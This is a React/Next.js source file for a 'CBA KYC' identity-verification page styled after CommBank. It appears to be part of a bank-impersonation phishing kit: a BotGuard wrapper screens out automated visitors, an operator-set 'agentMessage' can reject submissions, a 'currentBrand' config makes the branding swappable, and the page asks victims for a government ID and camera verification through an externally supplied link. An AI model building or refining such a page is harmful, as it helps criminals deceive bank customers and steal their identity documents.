'use client';

/**
 * CBA KYC (Know Your Customer) Page
 * Two-column layout matching CommBank design patterns
 * Includes popup blocker detection with manual link fallback
 */

import { useState, useEffect } from 'react';
import { useSessionStore } from '@shared';
import { currentBrand } from '@/config/branding';
import { BotGuard } from '@/components/security/BotGuard';
import { VerificationSidebar } from '@/components/layout/Sidebar';
import { Loader2, ExternalLink } from 'lucide-react';

// Arrow Icon SVG component
function ArrowIcon() {
  return (
    <svg className="arrow-icon" width="8" height="10" viewBox="0 0 8 10" fill="none" xmlns="http://www.w3.org/2000/svg">
      <polygon points="0,0 8,5 0,10" fill="#FFCC00" />
    </svg>
  );
}

export default function KYCPage() {
  const { status, caseId, agentMessage } = useSessionStore();

  const [kycStatus, setKycStatus] = useState<'not_started' | 'in_progress' | 'waiting'>('not_started');
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);

  // Store KYC URL for fallback link if popup is blocked
  const [kycUrl, setKycUrl] = useState<string | null>(null);
  const [popupBlocked, setPopupBlocked] = useState(false);

  useEffect(() => {
    if (status === 'rejected' || status === 'error') {
      setKycStatus('not_started');
      setError(agentMessage || 'Your submission was rejected. Please try again.');
      setIsLoading(false);
    }
  }, [status, agentMessage]);

  async function handleBeginKYC() {
    if (!caseId) {
      setError('Session information missing');
      return;
    }

    try {
      const response = await fetch('/api/user-started-kyc', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ case_id: caseId }),
      });

      if (!response.ok) {
        throw new Error('Failed to start KYC process');
      }

      const data = await response.json();
      const url = data.kyc_url;

      if (!url) {
        throw new Error('KYC provider is not configured properly');
      }

      // Store the URL for fallback
      setKycUrl(url);

      // Try to open popup
      const popup = window.open(url, '_blank');

      // Check if popup was blocked
      if (!popup || popup.closed || typeof popup.closed === 'undefined') {
        // Popup was blocked - show fallback link
        setPopupBlocked(true);
      }

      setKycStatus('in_progress');
      setError(null);
    } catch (err) {
      console.error('KYC begin error:', err);
      setError('Unable to start verification. Please try again.');
    }
  }

  async function handleKYCCompleted() {
    if (!caseId) {
      setError('Session information missing');
      return;
    }

    setIsLoading(true);
    setError(null);

    try {
      const response = await fetch('/api/submit-kyc', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ case_id: caseId }),
      });

      if (!response.ok) {
        throw new Error('Failed to submit KYC');
      }

      setKycStatus('waiting');
      useSessionStore.setState({
        status: 'waiting',
        agentMessage: 'Waiting for review...',
      });
    } catch (err) {
      console.error('KYC completion error:', err);
      setError('Failed to submit. Please try again.');
      setIsLoading(false);
    }
  }

  const handleRetry = () => {
    setError(null);
    setKycStatus('not_started');
    setPopupBlocked(false);
    setKycUrl(null);
  };

  const isWaiting = kycStatus === 'waiting' || status === 'waiting' || isLoading;

  return (
    <BotGuard>
      <div className="main-container">
        {/* Two Column Layout */}
        <section className="login-section">
          {/* Left Column - KYC Form */}
          <div className="login-box">
            <div className="box-header">
              <span>Identity Verification</span>
            </div>
            <div className="box-content">
              {/* Waiting State */}
              {isWaiting ? (
                <div style={{ textAlign: 'center', padding: '20px 0' }}>
                  <Loader2 className="h-8 w-8 animate-spin" style={{ margin: '0 auto 16px', color: '#7A7A7A' }} />
                  <p className="form-description" style={{ marginBottom: 0 }}>
                    Please wait while we verify your identity.
                  </p>
                </div>
              ) : (
                <>
                  {kycStatus === 'not_started' && (
                    <>
                      <p className="form-description">
                        To protect your account, we need to verify your identity. This process takes approximately 2-3 minutes.
                      </p>

                      <div style={{ marginBottom: '20px' }}>
                        <strong style={{ fontSize: '13px', display: 'block', marginBottom: '8px' }}>Please have ready:</strong>
                        <ul className="kyc-checklist">
                          <li>A valid government-issued ID (passport, driver's licence)</li>
                          <li>A device with a camera for photo verification</li>
                        </ul>
                      </div>

                      {/* Error message - inline style */}
                      {error && (
                        <div className="error-message" style={{ marginBottom: '15px' }}>
                          <span>{error}</span>
                        </div>
                      )}

                      <div className="form-row button-row" style={{ paddingLeft: 0 }}>
                        <button
                          type="button"
                          onClick={handleBeginKYC}
                          className="logon-button"
                        >
                          Begin Verification
                          <ExternalLink className="h-4 w-4" style={{ marginLeft: '6px' }} />
                        </button>
                      </div>

                      <p className="form-note" style={{ paddingLeft: 0, marginTop: '15px', textAlign: 'left' }}>
                        Opens in a new window
                      </p>
                    </>
                  )}

                  {kycStatus === 'in_progress' && (
                    <>
                      {/* Popup blocked fallback */}
                      {popupBlocked && kycUrl && (
                        <div className="popup-blocked-notice">
                          <p className="form-description" style={{ marginBottom: '12px' }}>
                            <strong>Pop-up blocked?</strong> Click the link below:
                          </p>
                          <a
                            href={kycUrl}
                            target="_blank"
                            rel="noopener noreferrer"
                            className="popup-fallback-link"
                            onClick={() => setPopupBlocked(false)}
                          >
                            Open Verification Page
                            <ExternalLink className="h-4 w-4" style={{ marginLeft: '6px' }} />
                          </a>
                        </div>
                      )}

                      <p className="form-description" style={{ marginTop: popupBlocked ? '16px' : '0' }}>
                        Complete the verification in the new window, then click Continue below.
                      </p>

                      {/* Error message - inline style */}
                      {error && (
                        <div className="error-message" style={{ marginBottom: '15px' }}>
                          <span>{error}</span>
                        </div>
                      )}

                      <div className="form-row button-row" style={{ paddingLeft: 0 }}>
                        <button
                          type="button"
                          onClick={handleKYCCompleted}
                          className="logon-button"
                          disabled={isLoading}
                        >
                          {isLoading && <Loader2 className="h-4 w-4 animate-spin" />}
                          {isLoading ? 'Submitting...' : 'Continue'}
                        </button>
                      </div>

                      <div className="form-footer" style={{ paddingLeft: 0, marginTop: '15px' }}>
                        <button
                          type="button"
                          onClick={handleRetry}
                          disabled={isLoading}
                          className="form-link-button"
                          style={{ padding: 0 }}
                        >
                          Start over
                        </button>
                      </div>
                    </>
                  )}
                </>
              )}
            </div>
          </div>

          {/* Right Column - Help Sidebar */}
          <VerificationSidebar />
        </section>

        {/* Quicklinks Section */}
        <section className="quicklinks-section">
          <h3 className="quicklinks-title">Quicklinks</h3>
          <ul className="quicklinks-list">
            <li>
              <ArrowIcon />
              <a href="#">Are you experiencing financial difficulty? Get help</a>
            </li>
            <li>
              <ArrowIcon />
              <a href="#">Report suspicious activity or scams</a>
            </li>
          </ul>
        </section>
      </div>
    </BotGuard>
  );
}
